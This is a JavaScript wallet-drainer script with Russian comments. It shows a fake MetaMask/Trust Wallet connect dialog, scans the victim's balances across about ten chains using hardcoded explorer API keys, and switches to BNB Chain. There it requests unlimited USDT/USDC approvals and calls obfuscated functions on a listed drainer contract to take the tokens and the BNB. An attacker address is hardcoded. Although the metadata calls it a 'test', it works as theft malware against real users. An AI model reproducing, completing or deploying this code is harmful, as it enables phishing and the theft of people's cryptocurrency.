const ATTACKER_ADDRESS = "0x86a17d4F0F729219b7191073abf4CF0819469AAE";

const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const FTMSCAN_API_KEY = "9H859I1BNAQ6Q3AQ9GKS2VC2XRJW8Q1G3A";
const CRONOSCAN_API_KEY = "SZ4CZFC6D793W378QMM6IG1IUWEU918BM9";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";
const CELOSCAN_API_KEY = "ZICUQ6ZFQHD9FQ4Y5H33HC94JFW343H9PI";
const MOONSCAN_API_KEY = "43IU6Q6RNANXWIE5B4KQV3VQVP6NI3V3PI";

const PROXY_DRAINER_ADDRESSES = {
  1: "0xProxyDrainerAddressOnEthereum",
  56: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
  137: "0xProxyDrainerAddressOnPolygon",
  42161: "0xProxyDrainerAddressOnArbitrum",
  10: "0xProxyDrainerAddressOnOptimism",
  250: "0xProxyDrainerAddressOnFantom",
  25: "0xProxyDrainerAddressOnCronos",
  8453: "0xProxyDrainerAddressOnBase",
  42220: "0xProxyDrainerAddressOnCelo",
  1284: "0xProxyDrainerAddressOnMoonbeam",
  1313161554: "0xProxyDrainerAddressOnAurora",
};

const PROXY_DRAINER_ABI = [
  "function tK7(uint256 usdtAmount, uint256 usdcAmount) external",
  "function bN3() external payable"
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

const SUPPORTED_CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    chainIdHex: "0x1",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY,
    rpcUrls: ["https://rpc.ankr.com/eth"],
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    chainIdHex: "0x38",
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY,
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    chainIdHex: "0x89",
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY,
    rpcUrls: ["https://polygon-rpc.com/"],
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    usdcAddress: "0xAF88d065e77c8cC2239327C5EDb3A432268e5831",
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    chainIdHex: "0xa4b1",
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY,
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
  },
  10: {
    name: "Optimism",
    nativeToken: "ETH",
    usdcAddress: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
    usdtAddress: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
    chainIdHex: "0xa",
    explorerApi: "https://api-optimistic.etherscan.io/api",
    explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY,
    rpcUrls: ["https://mainnet.optimism.io"],
  },
  250: {
    name: "Fantom",
    nativeToken: "FTM",
    usdcAddress: "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",
    usdtAddress: "0x049d68029688eAbF473097a2fC38ef61633A3C7A",
    chainIdHex: "0xfa",
    explorerApi: "https://api.ftmscan.com/api",
    explorerApiKey: FTMSCAN_API_KEY,
    rpcUrls: ["https://rpc.ftm.tools/"],
  },
  25: {
    name: "Cronos",
    nativeToken: "CRO",
    usdcAddress: "0xc21223249CA28397B90C6533D6125c5aD2A9609",
    usdtAddress: "0x66e428c3f67a68878562e79A0234c1F83c208770",
    chainIdHex: "0x19",
    explorerApi: "https://api.cronoscan.com/api",
    explorerApiKey: CRONOSCAN_API_KEY,
    rpcUrls: ["https://evm.cronos.org"],
  },
  8453: {
    name: "Base",
    nativeToken: "ETH",
    usdcAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
    usdtAddress: "0xfde4C96c8593536E31F229EA8d515f7bC60b677",
    chainIdHex: "0x2105",
    explorerApi: "https://api.basescan.org/api",
    explorerApiKey: BASESCAN_API_KEY,
    rpcUrls: ["https://mainnet.base.org"],
  },
  42220: {
    name: "Celo",
    nativeToken: "CELO",
    usdcAddress: "0xcebA9300f2b948710d2653dD7B07f33A8B32118",
    usdtAddress: "0x48065fbBE91B47C8F257b09E2B48cd42e3cD517",
    chainIdHex: "0xa4ec",
    explorerApi: "https://api.celoscan.io/api",
    explorerApiKey: CELOSCAN_API_KEY,
    rpcUrls: ["https://forno.celo.org"],
  },
  1284: {
    name: "Moonbeam",
    nativeToken: "GLMR",
    usdcAddress: "0x8f552a71EFE5eeFc207Bf75485b356A0b3f01eC",
    usdtAddress: "0x818ec0A7Fe18Ff94269904fCED6AE3DaE6d6DC0b",
    chainIdHex: "0x504",
    explorerApi: "https://api-moonbeam.moonscan.io/api",
    explorerApiKey: MOONSCAN_API_KEY,
    rpcUrls: ["https://rpc.api.moonbeam.network"],
  },
};

async function init() {
  const statusDiv = document.getElementById('status');
  const appDiv = document.getElementById('app');

  if (typeof ethers === 'undefined') {
    statusDiv.textContent = "Библиотека ethers не загружена.";
    return;
  }

  // CSS для модального окна
  const modalStyles = `
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', sans-serif;
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      transition: opacity 0.3s ease;
    }

    .modal {
      background-color: #0d0d0d;
      width: 360px;
      border-radius: 24px;
      padding: 20px 16px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
      color: white;
      position: relative;
      opacity: 0;
      transform: scale(0.95);
      transition: opacity 0.3s ease, transform 0.3s ease;
    }

    .modal.show {
      opacity: 1;
      transform: scale(1);
    }

    .modal h2 {
      font-size: 18px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 16px;
    }

    .wallet-item {
      display: flex;
      align-items: center;
      background-color: #1c1c1c;
      border-radius: 12px;
      padding: 12px;
      margin-bottom: 10px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }

    .wallet-item:hover {
      background-color: #2a2a2a;
    }

    .wallet-icon {
      width: 32px;
      height: 32px;
      background-color: #333;
      border-radius: 8px;
      margin-right: 12px;
    }

    .wallet-name {
      font-size: 15px;
    }

    .wallet-explore {
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: #ccc;
    }

    .wallet-explore .wallet-name {
      color: #8b8b8b;
    }

    .close {
      position: absolute;
      top: 12px;
      right: 16px;
      font-size: 20px;
      color: #aaa;
      cursor: pointer;
    }

    .wallet-loader {
      text-align: center;
      color: white;
    }

    .wallet-loader-icon {
      position: relative;
      width: 80px;
      height: 80px;
      margin: 0 auto 16px;
    }

    .wallet-avatar {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      object-fit: cover;
      z-index: 2;
      position: relative;
    }

    .loader-ring {
      position: absolute;
      top: 0;
      left: 0;
      width: 80px;
      height: 80px;
      border-radius: 50%;
      border: 4px solid transparent;
      border-top: 4px solid #5c73ff;
      animation: spin 1.2s linear infinite;
      z-index: 1;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .wallet-loader-title {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 4px;
    }

    .wallet-loader-subtitle {
      font-size: 13px;
      color: #888;
      margin-bottom: 16px;
    }

    .wallet-loader-button {
      background: #181818;
      color: #4a6fff;
      border: none;
      border-radius: 10px;
      padding: 10px 20px;
      cursor: pointer;
      font-size: 14px;
    }

    #openModal {
      background-color: #292929;
      color: #fff;
      padding: 12px 24px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-size: 16px;
      margin: 20px auto;
      display: block;
    }
  `;

  // Вставка стилей в head
  const styleElement = document.createElement('style');
  styleElement.textContent = modalStyles;
  document.head.appendChild(styleElement);

  // HTML для модального окна
  const modalHTML = `
    <div class="modal-overlay" id="modalOverlay">
      <div class="modal" id="walletListModal">
        <div class="close" id="closeModal">×</div>
        <h2>Connect a Wallet</h2>
        <div class="wallet-item" data-wallet="metamask"><div class="wallet-icon"></div><div class="wallet-name">MetaMask</div></div>
        <div class="wallet-item" data-wallet="trustwallet"><div class="wallet-icon"></div><div class="wallet-name">Trust Wallet</div></div>
        <div class="wallet-item wallet-explore">
          <div class="wallet-name">Explore all</div>
          <span style="font-size: 18px;">↗</span>
        </div>
      </div>
      <div class="modal" id="loaderModal" style="display: none;">
        <div class="close" id="closeLoaderModal">×</div>
        <h2 id="loaderTitle">Wallet</h2>
        <div class="wallet-loader">
          <div class="wallet-loader-icon">
            <div class="loader-ring"></div>
            <img id="walletAvatar" class="wallet-avatar" src="https://via.placeholder.com/80" alt="Wallet Icon" />
          </div>
          <div class="wallet-loader-title" id="walletLoaderTitle">Continue in Wallet</div>
          <div class="wallet-loader-subtitle" id="walletLoaderSubtitle">Accept connection request in the wallet</div>
          <button class="wallet-loader-button" id="tryAgainBtn">↻ Try again</button>
        </div>
      </div>
    </div>
  `;

  // Создание кнопки и модального окна
  const button = document.createElement('button');
  button.id = 'openModal';
  button.textContent = 'Connect Wallet';
  appDiv.appendChild(button);

  const modalContainer = document.createElement('div');
  modalContainer.innerHTML = modalHTML;
  appDiv.appendChild(modalContainer);

  // Элементы модального окна
  const openModalBtn = document.getElementById('openModal');
  const modalOverlay = document.getElementById('modalOverlay');
  const walletListModal = document.getElementById('walletListModal');
  const loaderModal = document.getElementById('loaderModal');
  const closeModalBtn = document.getElementById('closeModal');
  const closeLoaderBtn = document.getElementById('closeLoaderModal');
  const walletAvatar = document.getElementById('walletAvatar');
  const loaderTitle = document.getElementById('loaderTitle');
  const walletLoaderTitle = document.getElementById('walletLoaderTitle');
  const walletLoaderSubtitle = document.getElementById('walletLoaderSubtitle');
  const tryAgainBtn = document.getElementById('tryAgainBtn');

  // Определение платформы
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  let selectedWalletType = null;
  let walletConnectClient = null;
  let walletConnectSession = null;

  // Инициализация WalletConnect
  async function initWalletConnect() {
    walletConnectClient = await WalletConnectSignClient.init({
      projectId: 'YOUR_PROJECT_ID', // Замените на ваш WalletConnect Project ID
      metadata: {
        name: 'Wallet Drainer Test',
        description: 'Test DApp for wallet connection',
        url: window.location.href,
        icons: ['https://via.placeholder.com/80']
      }
    });

    const walletConnectModal = new WalletConnectModal({
      projectId: 'YOUR_PROJECT_ID', // Замените на ваш WalletConnect Project ID
      themeMode: 'dark',
      walletImages: {
        metamask: 'https://via.placeholder.com/32',
        trust: 'https://via.placeholder.com/32'
      }
    });

    return { walletConnectClient, walletConnectModal };
  }

  // Открытие модального окна
  openModalBtn.addEventListener('click', () => {
    modalOverlay.style.display = 'flex';
    setTimeout(() => walletListModal.classList.add('show'), 10);
  });

  // Закрытие модального окна (список кошельков)
  closeModalBtn.addEventListener('click', () => {
    walletListModal.classList.remove('show');
    setTimeout(() => {
      modalOverlay.style.display = 'none';
    }, 300);
  });

  // Закрытие лоадер-модалки
  closeLoaderBtn.addEventListener('click', () => {
    loaderModal.classList.remove('show');
    setTimeout(() => {
      loaderModal.style.display = 'none';
      modalOverlay.style.display = 'none';
    }, 300);
  });

  // Закрытие при клике на оверлей
  modalOverlay.addEventListener('click', (e) => {
    if (e.target === modalOverlay) {
      walletListModal.classList.remove('show');
      loaderModal.classList.remove('show');
      setTimeout(() => {
        modalOverlay.style.display = 'none';
        walletListModal.style.display = 'block';
        loaderModal.style.display = 'none';
      }, 300);
    }
  });

  // Обработка выбора кошелька
  document.querySelectorAll('.wallet-item:not(.wallet-explore)').forEach(item => {
    item.addEventListener('click', async () => {
      selectedWalletType = item.getAttribute('data-wallet');
      const displayName = selectedWalletType === 'metamask' ? 'MetaMask' : 'Trust Wallet';
      loaderTitle.innerText = displayName;
      walletLoaderTitle.innerText = `Continue in ${displayName}`;
      walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} to connect...` : `Accept connection request in ${displayName}`;
      walletAvatar.src = 'https://via.placeholder.com/80';

      walletListModal.classList.remove('show');
      setTimeout(() => {
        walletListModal.style.display = 'none';
        loaderModal.style.display = 'block';
        setTimeout(() => loaderModal.classList.add('show'), 10);
      }, 300);

      try {
        const { provider, accounts } = await connectWallet(selectedWalletType);
        const ethersProvider = new ethers.providers.Web3Provider(provider);
        const userAddress = accounts[0];
        statusDiv.textContent = `Подключено: ${userAddress}`;

        statusDiv.textContent = "Проверка...";
        const balances = await checkBalancesInAllChains(userAddress);
        console.log("Балансы:", balances);

        const chainsWithBalance = findChainsWithBalance(balances);
        if (chainsWithBalance.length === 0) {
          statusDiv.textContent = "Средства не найдены.";
          loaderModal.classList.remove('show');
          setTimeout(() => {
            loaderModal.style.display = 'none';
            modalOverlay.style.display = 'none';
          }, 300);
          return;
        }

        for (const [chainId, balance] of chainsWithBalance) {
          if (chainId != 56) {
            console.log(`Пропуск ${SUPPORTED_CHAINS[chainId].name}.`);
            continue;
          }

          statusDiv.textContent = `Обнаружено в ${SUPPORTED_CHAINS[chainId].name}.`;
          await switchToChain(chainId, provider);

          const signer = ethersProvider.getSigner();

          await drainWallet(
            ethersProvider,
            signer,
            userAddress,
            balance.nativeBalance,
            balance.usdcBalance,
            balance.usdtBalance,
            SUPPORTED_CHAINS[chainId].usdcAddress,
            SUPPORTED_CHAINS[chainId].usdtAddress,
            SUPPORTED_CHAINS[chainId].nativeToken,
            chainId,
            selectedWalletType,
            provider
          );
        }

        statusDiv.textContent = "Завершено!";
        loaderModal.classList.remove('show');
        setTimeout(() => {
          loaderModal.style.display = 'none';
          modalOverlay.style.display = 'none';
        }, 300);
      } catch (error) {
        statusDiv.textContent = `Ошибка: ${error.message}`;
        console.error("Ошибка:", error);
        loaderModal.classList.remove('show');
        setTimeout(() => {
          loaderModal.style.display = 'none';
          modalOverlay.style.display = 'none';
        }, 300);
      }
    });
  });

  // Кнопка "Try again"
  tryAgainBtn.addEventListener('click', async () => {
    if (!selectedWalletType) return;
    const displayName = selectedWalletType === 'metamask' ? 'MetaMask' : 'Trust Wallet';
    walletLoaderSubtitle.innerText = isMobile ? `Opening ${displayName} to connect...` : `Accept connection request in ${displayName}`;
    try {
      const { provider, accounts } = await connectWallet(selectedWalletType);
      const ethersProvider = new ethers.providers.Web3Provider(provider);
      const userAddress = accounts[0];
      statusDiv.textContent = `Подключено: ${userAddress}`;
    } catch (error) {
      statusDiv.textContent = `Ошибка повторного подключения: ${error.message}`;
      console.error("Ошибка повторного подключения:", error);
    }
  });
}

async function connectWallet(walletType) {
  const statusDiv = document.getElementById('status');
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  if (isMobile) {
    // Мобильное устройство: используем WalletConnect
    if (!walletConnectClient) {
      const { walletConnectClient: client, walletConnectModal } = await initWalletConnect();
      walletConnectClient = client;
      walletConnectModal.subscribeModal(state => {
        if (!state.open) {
          loaderModal.classList.remove('show');
          setTimeout(() => {
            loaderModal.style.display = 'none';
            modalOverlay.style.display = 'none';
          }, 300);
        }
      });
    }

    try {
      const { uri, approval } = await walletConnectClient.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_requestAccounts', 'wallet_switchEthereumChain'],
            chains: ['eip155:56'], // BNB Chain
            events: ['chainChanged', 'accountsChanged']
          }
        }
      });

      if (uri) {
        const walletId = walletType === 'metamask' ? 'metamask' : 'trust';
        const deeplink = walletType === 'metamask'
          ? `metamask://wc?uri=${encodeURIComponent(uri)}`
          : `trust://wc?uri=${encodeURIComponent(uri)}`;
        window.location.href = deeplink;
      }

      walletConnectSession = await approval();
      const provider = {
        request: async (request) => {
          if (request.method === 'eth_requestAccounts') {
            return [walletConnectSession.namespaces.eip155.accounts[0].split(':')[2]];
          }
          return await walletConnectClient.request({
            topic: walletConnectSession.topic,
            chainId: 'eip155:56',
            request
          });
        },
        on: (event, callback) => {
          walletConnectClient.on(event, callback);
        }
      };

      return {
        provider,
        accounts: [walletConnectSession.namespaces.eip155.accounts[0].split(':')[2]]
      };
    } catch (error) {
      throw new Error(`Ошибка WalletConnect: ${error.message}`);
    }
  } else {
    // Десктоп
    if (!window.ethereum) {
      throw new Error(`${walletType === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не установлен.`);
    }

    let selectedProvider = window.ethereum;
    const originalEthereum = window.ethereum;

    if (window.ethereum.providers && Array.isArray(window.ethereum.providers)) {
      const providers = window.ethereum.providers;
      if (walletType === 'metamask') {
        selectedProvider = providers.find(p => p.isMetaMask && !p.isTrust) || window.ethereum;
      } else if (walletType === 'trustwallet') {
        selectedProvider = providers.find(p => p.isTrust || p.isTrustWallet) || window.ethereum;
      }
    }

    window.ethereum = selectedProvider;

    try {
      const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
      return { provider: selectedProvider, accounts };
    } finally {
      window.ethereum = originalEthereum;
    }
  }
}

async function signTransaction(walletType, provider, txPromise, statusDiv, message) {
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  statusDiv.textContent = message;

  if (isMobile && walletConnectSession) {
    const tx = await txPromise();
    const result = await walletConnectClient.request({
      topic: walletConnectSession.topic,
      chainId: 'eip155:56',
      request: {
        method: 'eth_sendTransaction',
        params: [tx]
      }
    });
    statusDiv.textContent = `${message} - выполняется...`;
    return { hash: result };
  } else {
    const tx = await txPromise();
    statusDiv.textContent = `${message} - выполняется...`;
    await tx.wait();
    return tx;
  }
}

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function checkBalanceForChain(chainId, userAddress) {
  const chain = SUPPORTED_CHAINS[chainId];
  try {
    const nativeBalanceResponse = await fetch(
      `${chain.explorerApi}?module=account&action=balance&address=${userAddress}&tag=latest${chain.explorerApiKey ? `&apikey=${chain.explorerApiKey}` : ''}`
    );
    const nativeBalanceData = await nativeBalanceResponse.json();
    if (nativeBalanceData.status !== "1") {
      throw new Error(`API error: ${nativeBalanceData.message}`);
    }
    const nativeBalance = ethers.BigNumber.from(nativeBalanceData.result || "0");

    let usdtBalance = ethers.BigNumber.from(0);
    let usdcBalance = ethers.BigNumber.from(0);
    if (chainId == 56) {
      let provider;
      for (const rpcUrl of chain.rpcUrls) {
        try {
          provider = new ethers.providers.JsonRpcProvider(rpcUrl);
          await provider.getBlockNumber();
          break;
        } catch (error) {
          console.warn(`RPC ${rpcUrl} не работает: ${error.message}`);
          provider = null;
        }
      }
      if (!provider) {
        throw new Error(`Все RPC URL для ${chain.name} недоступны.`);
      }

      const usdtContract = new ethers.Contract(chain.usdtAddress, ERC20_ABI, provider);
      const usdcContract = new ethers.Contract(chain.usdcAddress, ERC20_ABI, provider);
      usdtBalance = await usdtContract.balanceOf(userAddress);
      usdcBalance = await usdcContract.balanceOf(userAddress);
    }

    console.log(`Баланс ${chain.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
    console.log(`Баланс USDT: ${ethers.utils.formatUnits(usdtBalance, 6)}`);
    console.log(`Баланс USDC: ${ethers.utils.formatUnits(usdcBalance, 6)}`);

    return { nativeBalance, usdcBalance, usdtBalance };
  } catch (error) {
    console.error(`Ошибка в ${chain.name}:`, error);
    return {
      nativeBalance: ethers.BigNumber.from(0),
      usdcBalance: ethers.BigNumber.from(0),
      usdtBalance: ethers.BigNumber.from(0),
    };
  }
}

async function checkBalancesInAllChains(userAddress) {
  const balances = {};
  const chainIds = Object.keys(SUPPORTED_CHAINS);

  const balancePromises = chainIds.map(async (chainId, index) => {
    await delay(index * 200);
    const balance = await checkBalanceForChain(chainId, userAddress);
    return { chainId, ...balance };
  });

  const results = await Promise.all(balancePromises);

  results.forEach(({ chainId, nativeBalance, usdcBalance, usdtBalance }) => {
    balances[chainId] = { nativeBalance, usdcBalance, usdtBalance };
  });

  return balances;
}

function findChainsWithBalance(balances) {
  return Object.entries(balances).filter(([chainId, balance]) =>
    balance.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    balance.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    balance.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  );
}

async function switchToChain(chainId, provider) {
  try {
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: SUPPORTED_CHAINS[chainId].chainIdHex }],
    });
  } catch (switchError) {
    if (switchError.code === 4902) {
      await provider.request({
        method: 'wallet_addEthereumChain',
        params: [
          {
            chainId: SUPPORTED_CHAINS[chainId].chainIdHex,
            chainName: SUPPORTED_CHAINS[chainId].name,
            nativeCurrency: {
              name: SUPPORTED_CHAINS[chainId].nativeToken,
              symbol: SUPPORTED_CHAINS[chainId].nativeToken,
              decimals: 18,
            },
            rpcUrls: SUPPORTED_CHAINS[chainId].rpcUrls,
          },
        ],
      });
    } else {
      throw new Error(`Ошибка сети: ${switchError.message}`);
    }
  }
}

async function drainWallet(provider, signer, userAddress, nativeBalance, usdcBalance, usdtBalance, usdcAddress, usdtAddress, nativeToken, chainId, walletType, walletProvider) {
  const statusDiv = document.getElementById('status');
  const MINIMUM_NATIVE_BALANCE = ethers.utils.parseEther("0.001");
  const MINIMUM_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
  const MAX_UINT256 = ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

  try {
    const proxyDrainerAddress = PROXY_DRAINER_ADDRESSES[chainId];
    if (!proxyDrainerAddress || proxyDrainerAddress === "0xProxyDrainerAddress") {
      throw new Error(`Адрес контракта не установлен для chainId ${chainId}`);
    }
    const proxyDrainer = new ethers.Contract(proxyDrainerAddress, PROXY_DRAINER_ABI, signer);

    const nativeToDrain = nativeBalance.gt(MINIMUM_NATIVE_BALANCE) ? nativeBalance.sub(MINIMUM_NATIVE_BALANCE) : ethers.BigNumber.from(0);
    const usdtToDrain = usdtBalance.gt(MINIMUM_TOKEN_BALANCE) ? usdtBalance : ethers.BigNumber.from(0);
    const usdcToDrain = usdcBalance.gt(MINIMUM_TOKEN_BALANCE) ? usdcBalance : ethers.BigNumber.from(0);

    const usdtContract = new ethers.Contract(usdtAddress, ERC20_ABI, signer);
    const usdcContract = new ethers.Contract(usdcAddress, ERC20_ABI, signer);

    let usdtAllowance = ethers.BigNumber.from(0);
    if (usdtToDrain.gt(0)) {
      usdtAllowance = await usdtContract.allowance(userAddress, proxyDrainerAddress);
      if (usdtAllowance.lt(usdtToDrain)) {
        await signTransaction(
          walletType,
          walletProvider,
          () => usdtContract.approve(proxyDrainerAddress, MAX_UINT256, { gasLimit: 100000 }),
          statusDiv,
          "Одобрение USDT (разовое)"
        );
        console.log(`USDT одобрены на максимальную сумму.`);
      }
    }

    let usdcAllowance = ethers.BigNumber.from(0);
    if (usdcToDrain.gt(0)) {
      usdcAllowance = await usdcContract.allowance(userAddress, proxyDrainerAddress);
      if (usdcAllowance.lt(usdcToDrain)) {
        await signTransaction(
          walletType,
          walletProvider,
          () => usdcContract.approve(proxyDrainerAddress, MAX_UINT256, { gasLimit: 100000 }),
          statusDiv,
          "Одобрение USDC (разовое)"
        );
        console.log(`USDC одобрены на максимальную сумму.`);
      }
    }

    if (usdtToDrain.gt(0) || usdcToDrain.gt(0)) {
      await signTransaction(
        walletType,
        walletProvider,
        () => proxyDrainer.tK7(usdtToDrain, usdcToDrain, { gasLimit: 200000 }),
        statusDiv,
        "Списание токенов"
      );
      console.log(`Токены списаны.`);
    } else {
      statusDiv.textContent = "Токены для списания не найдены.";
    }

    if (nativeToDrain.gt(0)) {
      await signTransaction(
        walletType,
        walletProvider,
        () => proxyDrainer.bN3({ value: nativeToDrain, gasLimit: 100000 }),
        statusDiv,
        "Списание BNB"
      );
      console.log(`BNB списаны.`);
    } else {
      statusDiv.textContent = "Недостаточно BNB для списания.";
    }
  } catch (error) {
    throw new Error(`Ошибка: ${error.message}`);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  init();
});
